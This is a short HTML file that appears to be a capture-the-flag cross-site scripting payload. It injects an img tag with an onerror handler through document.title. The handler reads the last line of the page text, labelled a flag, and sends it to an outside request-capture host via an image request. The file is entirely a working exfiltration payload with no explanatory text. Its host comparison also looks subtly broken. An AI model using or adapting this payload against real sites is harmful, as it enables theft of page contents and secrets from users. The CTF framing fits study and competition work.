<!DOCTYPE html>
<html>
<body>
  <script>
    document.title = `
      ${Date.now()}</h1>
      <img src=x onerror="
        if (location.host !== window.location.host) {
          const flag = document.body.innerText
            .trim()
            .split(/\r?\n/)
            .pop();
          new Image().src = \`https://ctfproblem.free.beeceptor.com/?flag=${encodeURIComponent(flag)}\`;
        }
      "><h1
    `;
  </script>
  <h1>Payload loaded :3</h1>
</body>
</html>
